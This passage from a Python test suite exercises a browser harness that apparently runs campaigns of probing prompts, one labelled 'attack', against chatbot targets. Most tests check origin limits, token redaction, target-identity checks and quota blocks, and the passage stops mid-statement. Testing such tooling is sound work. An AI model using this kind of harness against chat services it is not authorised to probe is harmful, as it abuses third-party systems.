    assert sealed["interface"] == "http_api"
    assert sealed["endpoint"] == "https://target.test/api/bank/message"
    interaction_steps = [step for step in sealed["api_steps"] if step["interaction"]]
    assert interaction_steps[0]["request_template"] == {"message": "{{input}}"}
    assert handoff.compiled_adapter
    assert handoff.compiled_adapter_digest


@pytest.mark.asyncio
async def test_dom_fallback_without_probe_linked_evidence_still_seals_dom() -> None:
    exchange = {
        "method": "POST",
        "url": "https://target.test/api/bank/message",
        "status": 200,
        "request_json": {"message": _PROBE_MESSAGE},
        "response_json": {"reply": "observed response"},
    }
    recorder = _NativeReceiptRecorder()
    tool = ApiReconHandoffTool(lambda _: _dom_fallback_session(exchange)(), recorder)

    result = await tool.invoke(
        ToolContext(session_id="s1", workspace_root="/tmp"),
        {
            "method": "browser",
            "url": "https://target.test/chat",
            "request_evidence_ref": "req",
            "response_evidence_ref": "res",
            "dom_fallback_reason": "browser write path never settles after submit",
            "reusable_adapter": reviewed_browser_adapter("https://target.test/chat"),
        },
    )

    assert result.is_error is False
    handoff = recorder.handoff
    assert handoff is not None
    assert handoff.adapter is None
    assert handoff.dom_fallback_reason == "browser write path never settles after submit"
    assert result.metadata["api_candidate_observed"].endswith("/api/bank/message")


@pytest.mark.asyncio
async def test_api_handoff_tool_canonicalizes_valid_model_json_before_sealing() -> None:
    class Recorder:
        recorded = None

        async def record_handoff(self, value):
            self.recorded = value

    recorder = Recorder()
    async with web_fixture() as origin:
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as session:
            tool = next(
                item
                for item in browser_tools(lambda _: session, recorder)
                if item.describe().name == "browser_record_api_handoff"
            )
            result = await tool.invoke(
                ToolContext(session_id="s1", workspace_root="/tmp"),
                {
                    "method": "POST",
                    "url": f"{origin}/api",
                    "request_evidence_ref": "req",
                    "response_evidence_ref": "res",
                    "adapter": reviewed_api_adapter_json(f"{origin}/api", route="fixture"),
                    "reusable_site_facts": '{ "site": "fixture", "routes": {} }',
                },
            )

    assert result.is_error is False
    assert recorder.recorded is not None
    expected_adapter = reviewed_api_adapter_json(f"{origin}/api", route="fixture")
    assert recorder.recorded.adapter == expected_adapter
    assert recorder.recorded.reusable_adapter == expected_adapter
    assert recorder.recorded.reusable_site_facts == '{"routes":{},"site":"fixture"}'


@pytest.mark.asyncio
async def test_api_handoff_tool_exposes_and_accepts_structured_adapter_schema() -> None:
    class Recorder:
        recorded = None

        async def record_handoff(self, value):
            self.recorded = value

    recorder = Recorder()
    async with web_fixture() as origin:
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as session:
            tool = next(
                item
                for item in browser_tools(lambda _: session, recorder)
                if item.describe().name == "browser_record_api_handoff"
            )
            handoff_schema = tool.describe().input_schema
            assert "oneOf" in handoff_schema
            assert "anyOf" not in handoff_schema
            assert handoff_schema["oneOf"] == [
                {"required": ["adapter"]},
                {"required": ["dom_fallback_reason", "reusable_adapter"]},
            ]
            adapter_schema = handoff_schema["properties"]["adapter"]
            step_schema = adapter_schema["properties"]["api_steps"]["items"]
            browser_schema = handoff_schema["properties"]["reusable_adapter"]
            assert adapter_schema["type"] == "object"
            assert "api_steps" not in browser_schema["required"]
            assert {"browser_steps", "interaction_contract"} <= set(browser_schema["required"])
            assert {
                "method",
                "request_template",
                "cleanup",
                "interaction",
            } <= set(step_schema["required"])
            assert {
                "response_selector",
                "success_witness",
                "expected_status",
                "replay_after_ambiguous_result",
            }.isdisjoint(step_schema["required"])
            adapter = json.loads(reviewed_api_adapter_json(f"{origin}/api"))
            result = await tool.invoke(
                ToolContext(session_id="s1", workspace_root="/tmp"),
                {
                    "method": "POST",
                    "url": f"{origin}/api",
                    "request_evidence_ref": "req",
                    "response_evidence_ref": "res",
                    "adapter": adapter,
                },
            )

    assert result.is_error is False
    assert recorder.recorded is not None
    assert recorder.recorded.adapter == reviewed_api_adapter_json(f"{origin}/api")


@pytest.mark.asyncio
async def test_api_handoff_normalizes_advisory_metadata_without_blocking_transport() -> None:
    class Recorder:
        recorded = None

        async def record_handoff(self, value):
            self.recorded = value

    recorder = Recorder()
    async with web_fixture() as origin:
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as session:
            tool = ApiReconHandoffTool(lambda _: session, recorder)
            adapter = {
                "interface": "http_api",
                "endpoint": f"{origin}/api",
                "authentication": "reviewed browser session",
                "observed_evidence": ["evidence:req", "evidence:res"],
                "session_constraint": "one reviewed session",
                "api_steps": [
                    {
                        "step_id": "message",
                        "endpoint": f"{origin}/api",
                        "method": "POST",
                        "request_template": {"message": "{{input}}"},
                        "response_selector": "$.stale[*]",
                        "success_witness": None,
                        "expected_status": "usually 200",
                        "replay_after_ambiguous_result": "maybe",
                        "cleanup": False,
                        "interaction": True,
                        "captures": {"unused": "not-a-pointer"},
                        "repeat": 1,
                    }
                ],
            }

            result = await tool.invoke(
                ToolContext(session_id="s1", workspace_root="/tmp"),
                {
                    "method": "POST",
                    "url": f"{origin}/api",
                    "request_evidence_ref": "evidence:req",
                    "response_evidence_ref": "evidence:res",
                    "adapter": adapter,
                },
            )

    assert result.is_error is False
    normalized = json.loads(recorder.recorded.adapter)
    step = normalized["api_steps"][0]
    assert step["response_selector"] == ""
    assert step["expected_status"] is None
    assert step["replay_after_ambiguous_result"] is False
    assert step["idempotency_key"] is None
    assert step["captures"] == {}
    assert all(
        item["kind"] == "evaluation_uncertain" for item in normalized["evaluation_uncertainties"]
    )
    assert result.metadata["evaluation_uncertainties"]


@pytest.mark.asyncio
async def test_api_handoff_keeps_required_capture_and_origin_safeguards_hard() -> None:
    class Recorder:
        recorded = None

        async def record_handoff(self, value):
            self.recorded = value

    recorder = Recorder()
    async with web_fixture() as origin:
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as session:
            tool = ApiReconHandoffTool(lambda _: session, recorder)
            adapter = json.loads(reviewed_api_adapter_json(f"{origin}/api"))
            adapter["api_steps"] = [
                {
                    **adapter["api_steps"][0],
                    "step_id": "setup",
                    "interaction": False,
                    "captures": {"session_id": "not-a-pointer"},
                },
                {
                    **adapter["api_steps"][0],
                    "request_template": {"session": "{{capture:session_id}}"},
                },
            ]
            capture_result = await tool.invoke(
                ToolContext(session_id="s1", workspace_root="/tmp"),
                {
                    "method": "POST",
                    "url": f"{origin}/api",
                    "request_evidence_ref": "evidence:req",
                    "response_evidence_ref": "evidence:res",
                    "adapter": adapter,
                },
            )

            cross_origin = json.loads(reviewed_api_adapter_json("https://outside.test/api"))
            origin_result = await tool.invoke(
                ToolContext(session_id="s1", workspace_root="/tmp"),
                {
                    "method": "POST",
                    "url": f"{origin}/api",
                    "request_evidence_ref": "evidence:req",
                    "response_evidence_ref": "evidence:res",
                    "adapter": cross_origin,
                },
            )

    assert capture_result.is_error is True
    assert "captures must map names to JSON Pointers" in capture_result.content
    assert origin_result.is_error is True
    assert "outside the reviewed browser target boundary" in origin_result.content
    assert recorder.recorded is None


@pytest.mark.asyncio
async def test_chat_composer_press_and_delivery_verification_are_durable() -> None:
    chat = b"""
    <textarea aria-label="Message" maxlength="500"
      onkeydown="if(event.key==='Enter'){
        document.getElementById('reply').textContent='Message delivered'
      }"></textarea>
    <div id="reply"></div>
    <select aria-label="Mode"><option value="safe">Safe</option></select>
    <input type="checkbox" aria-label="Remember">
    """
    async with web_fixture(chat) as origin:
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as session:
            tab = await session.new_tab(origin)
            snapshot = await session.snapshot(tab)
            message = next(item for item in snapshot.elements if item.name == "Message")
            mode = next(item for item in snapshot.elements if item.name == "Mode")
            remember = next(item for item in snapshot.elements if item.name == "Remember")
            assert message.max_length == 500
            assert message.disabled is False
            assert message.read_only is False
            await session.act(action(session, tab, "fill", element_ref=message.ref, value="hello"))
            await session.act(action(session, tab, "press", element_ref=message.ref, value="Enter"))
            verified = await session.act(
                action(session, tab, "wait_for_text", value="Message delivered")
            )
            await session.act(action(session, tab, "select", element_ref=mode.ref, value="safe"))
            await session.act(action(session, tab, "check", element_ref=remember.ref))
            assert verified.text == "verified visible text: Message delivered"


@pytest.mark.asyncio
async def test_compiled_chat_exchange_fills_submits_and_observes_in_one_tool_call() -> None:
    chat = b"""
    <textarea aria-label="Message" maxlength="500"></textarea>
    <button aria-label="Send" onclick="
      document.getElementById('reply').textContent=
        'assistant:'+document.querySelector('textarea').value;
    ">Send</button>
    <div id="reply" aria-live="polite"></div>
    """

    class Recorder:
        def __init__(self) -> None:
            self.actions, self.observations, self.evidence = [], [], []

        async def append_action(self, value):
            self.actions.append(value)

        async def append_observation(self, value):
            self.observations.append(value)

        async def record_evidence(self, *value):
            self.evidence.append(value)

        async def save_metadata(self, value):
            self.metadata = value

    async with web_fixture(chat) as origin:
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as session:
            stale_tab = await session.new_tab(f"{origin}/api/message")
            tab = await session.new_tab(origin)
            snapshot = await session.snapshot(tab)
            message = next(item for item in snapshot.elements if item.name == "Message")
            send = next(item for item in snapshot.elements if item.name == "Send")
            adapter = reviewed_browser_adapter(origin)
            adapter["browser_steps"] = [
                {
                    "step_id": "fill",
                    "tool": "browser_fill",
                    "interaction": False,
                    "arguments": {"element_ref": message.ref},
                },
                {
                    "step_id": "submit",
                    "tool": "browser_click",
                    "interaction": True,
                    "arguments": {"element_ref": send.ref},
                },
            ]
            adapter["state_capabilities"] = {
                "identity": {
                    "identity_scope": "physical_state",
                    "baseline_selector": {
                        "step_id": "fill",
                        "evaluation_root": "response_body",
                        "pointer": "/principal",
                    },
                    "result_selector": {
                        "step_id": "submit",
                        "evaluation_root": "response_body",
                        "pointer": "/principal",
                    },
                    "evidence_refs": ["fixture:principal-contract"],
                },
                "observations": [
                    {
                        "name": "messages_remaining",
                        "role": "budget_remaining",
                        "baseline_selector": {
                            "step_id": "fill",
                            "evaluation_root": "response_body",
                            "pointer": "/remaining",
                        },
                        "result_selector": {
                            "step_id": "submit",
                            "evaluation_root": "response_body",
                            "pointer": "/remaining",
                        },
                        "value_type": "integer",
                    }
                ],
                "resource_ownership": [
                    {
                        "name": "shared_message_quota",
                        "resource_kind": "quota",
                        "resource_observation_name": "messages_remaining",
                        "principal_selector": {
                            "step_id": "fill",
                            "evaluation_root": "response_body",
                            "pointer": "/principal",
                        },
                    }
                ],
                "resource_controls": [
                    {
                        "ownership_name": "shared_message_quota",
                        "step_id": "submit",
                        "limit": 1,
                        "window_key": "fixture-window",
                        "structured_blocks": [
                            {
                                "status_codes": [429],
                                "retry_after_seconds_pointer": "/retry_after_seconds",
                                "evidence_refs": ["fixture:quota-contract"],
                            }
                        ],
                    }
                ],
            }
            recorder = Recorder()
            state_scope_store = _StateScopeFixtureStore()

            async def allow(*_):
                return True

            broker = ToolBroker(
                browser_tools(
                    lambda _: session,
                    recorder,
                    lambda _: adapter,
                    state_scope_store,
                ),
                confirmer=allow,
            )
            result = await broker.invoke(
                "browser_chat_exchange",
                ToolContext(session_id="s1", workspace_root="/tmp", campaign_id="campaign:test"),
                {"prompt": "hello"},
            )

            assert result.is_error is False
            assert result.metadata["compiled_flow"] == "merlin.browser-flow.v1"
            assert result.metadata["input_value_verified"] is True
            assert result.metadata["response_witness"] == "assistant:hello"
            assert [item.kind for item in recorder.actions] == ["fill", "click"]
            assert {item.tab_ref for item in recorder.actions} == {tab}
            assert stale_tab != tab
            assert "assistant:hello" in result.content
            exchange = result.metadata["target_exchanges"][0]
            assert isinstance(exchange["latency_ms"], int)
            assert exchange["latency_ms"] >= 0
            assert state_scope_store.events == [
                "created",
                "claimed",
                "resource_reserved",
                "resource_acknowledged",
                "revised",
                "acknowledged",
                "resource_settled",
                "settled",
                "released",
            ]
            assert state_scope_store.claim_calls[0]["equivalence_key"] == (
                "conservative-shared-state"
            )
            assert state_scope_store.claim_calls[0]["principal_key"] == "anonymous"

            recorder.actions.clear()
            blocked = await broker.invoke(
                "browser_chat_exchange",
                ToolContext(session_id="s1", workspace_root="/tmp", campaign_id="campaign:test"),
                {"prompt": "second"},
            )
            assert blocked.is_error is True
            assert blocked.metadata["failure_code"] == "target_resource_blocked"
            assert blocked.metadata["target_effect_attempted"] is False
            assert blocked.metadata["target_call_budget_charge"] == 0
            assert recorder.actions == []


@pytest.mark.asyncio
async def test_reviewed_clone_isolation_rekeys_cross_campaign_browser_scopes() -> None:
    chat = b"""
    <input aria-label="Clone state">
    <textarea aria-label="Message" maxlength="500"></textarea>
    <button aria-label="Send" onclick="
      document.getElementById('reply').textContent =
        'assistant:' + document.querySelector('textarea').value;
    ">Send</button>
    <div id="reply" aria-live="polite"></div>
    """

    class Recorder:
        async def append_action(self, _value):
            return None

        async def append_observation(self, _value):
            return None

        async def record_evidence(self, *_value):
            return None

        async def save_metadata(self, _value):
            return None

    async def allow(*_):
        return True

    async with web_fixture(chat) as origin:
        adapter = reviewed_browser_adapter(origin)
        adapter["browser_steps"] = [
            {
                "step_id": "clone",
                "tool": "browser_fill",
                "interaction": False,
                "arguments": {"locator": "textbox Clone state", "value": "clone"},
            },
            {
                "step_id": "fill",
                "tool": "browser_fill",
                "interaction": True,
                "arguments": {"locator": "textbox Message"},
            },
            {
                "step_id": "submit",
                "tool": "browser_click",
                "interaction": True,
                "arguments": {"locator": "button Send"},
            },
        ]
        adapter["state_capabilities"] = {
            "identity": {
                "identity_scope": "physical_state",
                "baseline_selector": {
                    "step_id": "clone",
                    "evaluation_root": "response_body",
                    "pointer": "/context_id",
                },
                "result_selector": {
                    "step_id": "submit",
                    "evaluation_root": "response_body",
                    "pointer": "/context_id",
                },
            },
            "freshness_rules": [
                {
                    "selector": {
                        "step_id": "clone",
                        "evaluation_root": "response_body",
                        "pointer": "/target_id",
                    },
                    "match_values": ["target"],
                }
            ],
            "affordances": [
                {
                    "kind": "clone_state",
                    "step_id": "clone",
                    "evaluation_root": "response_body",
                }
            ],
            "maximum_parallel_states": 2,
        }
        store = _StateScopeFixtureStore(enforce_conflicts=True)
        first = await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        )
        second = await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        )
        try:
            await asyncio.gather(first.new_tab(origin), second.new_tab(origin))
            sessions = {"s1": first, "s2": second}
            broker = ToolBroker(
                browser_tools(
                    lambda session_id: sessions[session_id],
                    Recorder(),
                    lambda _campaign_id: adapter,
                    store,
                ),
                confirmer=allow,
            )
            results = await asyncio.gather(
                broker.invoke(
                    "browser_chat_exchange",
                    ToolContext(
                        session_id="s1",
                        workspace_root="/tmp",
                        campaign_id="campaign:clone-a",
                    ),
                    {"prompt": "first", "timeout_ms": 1000},
                ),
                broker.invoke(
                    "browser_chat_exchange",
                    ToolContext(
                        session_id="s2",
                        workspace_root="/tmp",
                        campaign_id="campaign:clone-b",
                    ),
                    {"prompt": "second", "timeout_ms": 1000},
                ),
            )
            capabilities = adapter["state_capabilities"]
            assert isinstance(capabilities, dict)
            freshness_rules = capabilities["freshness_rules"]
            assert isinstance(freshness_rules, list)
            freshness_rules[0]["match_values"] = ["not-this-target"]
            rejected = await broker.invoke(
                "browser_chat_exchange",
                ToolContext(
                    session_id="s1",
                    workspace_root="/tmp",
                    campaign_id="campaign:clone-proof-failed",
                ),
                {"prompt": "must not be delivered", "timeout_ms": 1000},
            )
        finally:
            await asyncio.gather(first.close(), second.close())

    assert all(result.is_error is False for result in results)
    assert len(store.rekey_calls) == 2
    assert {item["maximum_parallel_states"] for item in store.rekey_calls} == {2}
    assert len({item["equivalence_key"] for item in store.rekey_calls}) == 2
    assert all(
        result.metadata["target_exchanges"][0]["target_state_transition"]["identity_match"] is True
        for result in results
    )
    assert rejected.is_error is True
    assert rejected.metadata["failure_code"] == "physical_state_unavailable"
    assert rejected.metadata["target_effect_attempted"] is False
    assert rejected.metadata["target_call_budget_charge"] == 0


@pytest.mark.asyncio
async def test_browser_checkpoint_requires_sealed_gate_then_restores_under_fresh_scope() -> None:
    chat = b"""
    <input autocomplete="current-password" aria-label="Checkpoint">
    <textarea aria-label="Message" maxlength="500"></textarea>
    <button aria-label="Send" onclick="
      const restored = !location.search || document.querySelector('input').value.length > 0;
      this.textContent = restored ? 'Gate complete' : 'Restore failed';
      this.setAttribute('aria-label', this.textContent);
      if (restored) document.querySelector('input').setAttribute(
        'aria-label', 'opaque-state-handle'
      );
      document.getElementById('reply').textContent = this.textContent;
    ">Send</button>
    <div id="reply" aria-live="polite"></div>
    """

    class Recorder:
        def __init__(self) -> None:
            self.actions = []
            self.observations = []

        async def append_action(self, value):
            self.actions.append(value)

        async def append_observation(self, value):
            self.observations.append(value)

        async def record_evidence(self, *_value):
            return None

        async def save_metadata(self, _value):
            return None

    def checkpoint_adapter(endpoint: str) -> dict[str, object]:
        adapter = reviewed_browser_adapter(endpoint)
        adapter["browser_steps"] = [
            {
                "step_id": "restore",
                "tool": "browser_fill",
                "interaction": False,
                "arguments": {
                    "locator": "textbox Checkpoint",
                    "value": "{{capture:state_handle}}",
                },
            },
            {
                "step_id": "baseline",
                "tool": "browser_fill",
                "interaction": False,
                "arguments": {"locator": "textbox Message", "value": "baseline"},
            },
            {
                "step_id": "fill",
                "tool": "browser_fill",
                "interaction": True,
                "arguments": {"locator": "textbox Message"},
            },
            {
                "step_id": "submit",
                "tool": "browser_click",
                "interaction": True,
                "arguments": {"locator": "button Send"},
            },
        ]
        adapter["interaction_contract"]["oracle_predicates"] = [
            {
                "purpose": "objective",
                "oracle_digest": "sha256:" + "1" * 64,
                "pointer": "/target_id",
                "match_values": ["target"],
                "modality": "dom",
                "turn": "single",
                "language": "en",
            }
        ]
        adapter["state_capabilities"] = {
            "identity": {
                "identity_scope": "physical_state",
                "baseline_selector": {
                    "step_id": "baseline",
                    "evaluation_root": "response_body",
                    "pointer": "/context_id",
                },
                "result_selector": {
                    "step_id": "submit",
                    "evaluation_root": "response_body",
                    "pointer": "/context_id",
                },
            },
            "observations": [
                {
                    "name": "gate_status",
                    "role": "custom",
                    "baseline_selector": {
                        "step_id": "baseline",
                        "evaluation_root": "response_body",
                        "pointer": "/elements/1/name",
                    },
                    "result_selector": {
                        "step_id": "submit",
                        "evaluation_root": "response_body",
                        "pointer": "/elements/1/name",
                    },
                    "success_values": ["Gate complete"],
                    "value_type": "string",
                    "trust_class": "host_observed",
                }
            ],
            "affordances": [
                {
                    "kind": "restore_checkpoint",
                    "step_id": "restore",
                    "evaluation_root": "response_body",
                }
            ],
            "checkpoint": {
                "capture_selector": {
                    "step_id": "submit",
                    "evaluation_root": "response_body",
                    "pointer": "/elements/3/name",
                },
                "capture_timing": "post_success_response",
                "binding_name": "state_handle",
                "restore_step_id": "restore",
                "restore_request_pointer": "/value",
            },
        }
        return adapter

    async def allow(*_):
        return True

    def context(intent, *, expected="Gate complete", reference=None):
        return ToolContext(
            session_id="s1",
            workspace_root="/tmp",
            campaign_id="campaign:test",
            objective_phase_gate_id="gate:test",
            objective_phase_gate_recipe_digest="sha256:" + "2" * 64,
            objective_phase_manifest_digest="sha256:" + "3" * 64,
            objective_phase_checkpoint_intent=intent,
            objective_phase_checkpoint_reference=reference,
            objective_phase_gate_contract={
                "success_predicate": {
                    "observation_name": "gate_status",
                    "operator": "equals",
                    "expected_values": [expected],
                }
            },
        )

    store = _StateScopeFixtureStore()
    vault = _CheckpointVaultFixture()
    async with web_fixture(chat) as origin:
        adapter = checkpoint_adapter(origin)
        capture_recorder = Recorder()
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as rejected_session:
            await rejected_session.new_tab(origin)
            rejected = await ToolBroker(
                browser_tools(
                    lambda _: rejected_session,
                    Recorder(),
                    lambda _: adapter,
                    store,
                    store,
                    vault,
                ),
                confirmer=allow,
            ).invoke(
                "browser_chat_exchange",
                context("capture", expected="Impossible"),
                {"prompt": "prerequisite", "timeout_ms": 1000},
            )
            assert rejected.is_error is True
            assert rejected.metadata.get("failure_code") == "checkpoint_success_unproven", (
                rejected.content,
                rejected.metadata,
            )
            rejected_exchange = rejected.metadata["target_exchanges"][0]
            assert rejected_exchange["oracle_observation"]["matched"] is True
            assert vault.secrets == {}

        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as capture_session:
            await capture_session.new_tab(origin)
            capture = await ToolBroker(
                browser_tools(
                    lambda _: capture_session,
                    capture_recorder,
                    lambda _: adapter,
                    store,
                    store,
                    vault,
                ),
                confirmer=allow,
            ).invoke(
                "browser_chat_exchange",
                context("capture"),
                {"prompt": "prerequisite", "timeout_ms": 1000},
            )
            assert capture.is_error is False, json.dumps(
                {
                    "transition": capture.metadata.get("target_state_transition"),
                    "elements": [
                        [element.name for element in observation.elements]
                        for observation in capture_recorder.observations
                    ],
                },
                sort_keys=True,
            )
            checkpoint = capture.metadata["objective_phase_checkpoint"]
            reference = checkpoint["checkpoint_reference"]
            assert checkpoint["captured"] is True
            assert "opaque-state-handle" not in json.dumps(checkpoint)

        restore_recorder = Recorder()
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as restore_session:
            await restore_session.new_tab(origin + "?restore=1")
            restored = await ToolBroker(
                browser_tools(
                    lambda _: restore_session,
                    restore_recorder,
                    lambda _: adapter,
                    store,
                    store,
                    vault,
                ),
                confirmer=allow,
            ).invoke(
                "browser_chat_exchange",
                context("restore", reference=reference),
                {"prompt": "attack", "timeout_ms": 1000},
            )
            assert restored.is_error is False
            assert restored.metadata["objective_phase_checkpoint"]["restored"] is True
            assert "Gate complete" in restored.content
            assert all(
                action.value != capture_session.context_id for action in restore_recorder.actions
            )
            restore_action = next(
                action for action in restore_recorder.actions if action.element_ref is not None
            )
            assert restore_action.value == "[redacted]"


@pytest.mark.asyncio
async def test_compiled_chat_exchange_executes_normalized_steps_and_emits_both_digests() -> None:
    from merlin_contracts.target_adapter_compiler import (
        compile_target_adapter,
        compiled_target_adapter_digest,
    )

    chat = b"""
    <textarea aria-label="Message" maxlength="500"
      onkeydown="if(event.key==='Enter'){
        document.getElementById('reply').textContent='assistant:'+this.value;
      }"></textarea>
    <div id="reply" aria-live="polite"></div>
    """

    class Recorder:
        def __init__(self) -> None:
            self.actions = []

        async def append_action(self, value):
            self.actions.append(value)

        async def append_observation(self, _value):
            return None

        async def record_evidence(self, *_value):
            return None

        async def save_metadata(self, _value):
            return None

    async with web_fixture(chat) as origin:
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as session:
            await session.new_tab(origin)
            adapter = reviewed_browser_adapter(origin)
            adapter["browser_steps"] = [
                {
                    "step_id": "baseline",
                    "tool": "browser_fill",
                    "arguments": {
                        "locator": "textbox Message",
                        "value": "{{user_input}}",
                        "non_executable_note": "compiler drops this advisory field",
                    },
                },
                {
                    "step_id": "submit",
                    "tool": "browser_press",
                    "arguments": {"locator": "textbox Message", "key": "Enter"},
                },
            ]
            adapter["interaction_contract"]["input_limit"]["max_characters"] = 3
            compilation = compile_target_adapter(adapter)
            adapter["compiled_adapter"] = json.dumps(
                compilation.model_dump(mode="json"),
                sort_keys=True,
                separators=(",", ":"),
            )
            expected_compiled_digest = compiled_target_adapter_digest(compilation)
            adapter["compiled_adapter_digest"] = expected_compiled_digest
            recorder = Recorder()

            async def allow(*_):
                return True

            result = await ToolBroker(
                browser_tools(lambda _: session, recorder, lambda _: adapter),
                confirmer=allow,
            ).invoke(
                "browser_chat_exchange",
                ToolContext(session_id="s1", workspace_root="/tmp", campaign_id="campaign:test"),
                {"prompt": "hello"},
            )

            assert result.is_error is True
            assert recorder.actions == []
            assert result.metadata["adapter_digest"] == executable_adapter_digest(adapter)
            assert result.metadata["compiled_adapter_digest"] == expected_compiled_digest
            assert result.metadata["target_profile_id"] == "target"
            assert result.metadata["attempt_disposition"] == "protocol_invalid"
            assert result.metadata["target_effect_attempted"] is False
            assert result.metadata["target_call_budget_charge"] == 0
            observation = result.metadata["request_constraint_observations"][0]
            assert observation["maximum"] == 3
            assert observation["observed"] == 5


@pytest.mark.asyncio
async def test_compiled_chat_exchange_rejects_context_seal_drift_before_browser_observation() -> (
    None
):
    from merlin_browser.tools import BrowserChatExchangeTool
    from merlin_contracts.target_adapter_compiler import (
        compile_target_adapter,
        compiled_target_adapter_digest,
    )

    class NoEffectSession:
        context_id = "browser-context"
        bounds = SimpleNamespace(
            target_id="target",
            allowed_origins={"https://target.test"},
        )

        def __init__(self) -> None:
            self.snapshot_calls = 0

        async def snapshot(self, *_args, **_kwargs):
            self.snapshot_calls += 1
            raise AssertionError("context drift must fail before a browser snapshot")

    class NoEffectRecorder:
        def __init__(self) -> None:
            self.calls = []

        def __getattr__(self, name):
            async def record(*_args, **_kwargs):
                self.calls.append(name)

            return record

    def adapter_for(endpoint: str) -> dict[str, object]:
        value = reviewed_browser_adapter(endpoint)
        value["browser_steps"] = [
            {
                "tool": "browser_fill",
                "arguments": {"locator": "textbox Message", "value": "{{input}}"},
            },
            {
                "tool": "browser_press",
                "arguments": {"locator": "textbox Message", "value": "Enter"},
            },
        ]
        return value

    adapter = adapter_for("https://target.test/chat")
    resolved = compile_target_adapter(adapter)
    adapter["compiled_adapter"] = resolved.model_dump_json()
    adapter["compiled_adapter_digest"] = compiled_target_adapter_digest(resolved)
    drifted = compile_target_adapter(adapter_for("https://target.test/other-chat"))
    drifted_digest = compiled_target_adapter_digest(drifted)
    session = NoEffectSession()
    recorder = NoEffectRecorder()

    result = await BrowserChatExchangeTool(
        lambda _: session,
        recorder,  # type: ignore[arg-type]
        lambda _: adapter,
    ).invoke(
        ToolContext(
            session_id="s1",
            workspace_root="/tmp",
            campaign_id="campaign:test",
            target_id="target",
            compiled_adapter=drifted.model_dump_json(),
            compiled_adapter_digest=drifted_digest,
        ),
        {"prompt": "must not be sent"},
    )

    assert result.is_error is True
    assert result.metadata == {
        "effect": "target_network",
        "failure_code": "adapter_state_integrity",
        "retryable": False,
        "effect_applied": False,
        "target_call_budget_charge": 0,
        "identity_field": "compiled_adapter_digest",
        "expected": drifted_digest,
        "observed": compiled_target_adapter_digest(resolved),
    }
    assert session.snapshot_calls == 0
    assert recorder.calls == []


@pytest.mark.asyncio
async def test_compiled_chat_exchange_rejects_wrong_target_before_browser_observation() -> None:
    from merlin_browser.tools import BrowserChatExchangeTool

    class NoEffectSession:
        context_id = "browser-context"
        bounds = SimpleNamespace(
            target_id="target-observed",
            allowed_origins={"https://target.test"},
        )

        def __init__(self) -> None:
            self.snapshot_calls = 0

        async def snapshot(self, *_args, **_kwargs):
            self.snapshot_calls += 1
            raise AssertionError("target drift must fail before a browser snapshot")

    class NoEffectRecorder:
        def __init__(self) -> None:
            self.calls = []

        def __getattr__(self, name):
            async def record(*_args, **_kwargs):
                self.calls.append(name)

            return record

    session = NoEffectSession()
    recorder = NoEffectRecorder()
    result = await BrowserChatExchangeTool(
        lambda _: session,
        recorder,  # type: ignore[arg-type]
        lambda _: reviewed_browser_adapter("https://target.test/chat"),
    ).invoke(
        ToolContext(
            session_id="s1",
            workspace_root="/tmp",
            campaign_id="campaign:test",
            target_id="target-expected",
        ),
        {"prompt": "must not be sent"},
    )

    assert result.is_error is True
    assert result.metadata["failure_code"] == "target_identity_mismatch"
    assert result.metadata["effect_applied"] is False
    assert result.metadata["target_call_budget_charge"] == 0
    assert result.metadata["identity_field"] == "target_id"
    assert result.metadata["expected"] == "target-expected"
    assert result.metadata["observed"] == "target-observed"
    assert session.snapshot_calls == 0
    assert recorder.calls == []


@pytest.mark.asyncio
async def test_real_browser_executes_every_reviewed_multilingual_variant() -> None:
    chat = b"""
    <textarea aria-label="Message" maxlength="500"></textarea>
    <button aria-label="Send" onclick="
      const value=document.querySelector('textarea').value;
      let mode='native';
      if(value.startsWith('Explique')) mode='translated';
      if(value.startsWith('Please explica')) mode='mixed';
      if(!value.startsWith('Please') && value.includes('policy')) mode='script-switching';
      document.getElementById('reply').textContent='accepted:'+mode;
    ">Send</button>
    <div id="reply" aria-live="polite"></div>
    """
    variants = (
        ("Please explain the refund policy.", "native"),
        ("Explique la política de reembolso.", "translated"),
        ("Please explica la política refund.", "mixed"),
        ("返金 policy を explain してください。", "script-switching"),
    )
    async with web_fixture(chat) as origin:
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as session:
            tab = await session.new_tab(origin)
            snapshot = await session.snapshot(tab)
            message = next(item for item in snapshot.elements if item.name == "Message")
            send = next(item for item in snapshot.elements if item.name == "Send")

            for step, (prompt, expected) in enumerate(variants, start=1):
                await session.act(
                    action(session, tab, "fill", element_ref=message.ref, value=prompt, step=step)
                )
                await session.act(action(session, tab, "click", element_ref=send.ref, step=step))
                observed = await session.act(
                    action(session, tab, "wait_for_text", value=f"accepted:{expected}", step=step)
                )
                assert observed.text == f"verified visible text: accepted:{expected}"


@pytest.mark.asyncio
async def test_network_observation_is_event_driven_bounded_and_redacts_query_strings() -> None:
    async with web_fixture() as origin:
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as session:
            tab = await session.new_tab(origin + "/?token=secret")
            observed = await session.act(action(session, tab, "network_events"))

            assert observed.kind == "network"
            assert '"status":200' in observed.text
            assert '"resource_type":"document"' in observed.text
            assert "token=secret" not in observed.text
            assert observed.evidence_refs


@pytest.mark.asyncio
async def test_network_observation_captures_bounded_redacted_json_exchange() -> None:
    async with web_fixture() as origin:
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as session:
            tab = await session.new_tab(origin)
            page = session.context.pages[-1]
            await page.evaluate(
                """async () => fetch('/api/message', {
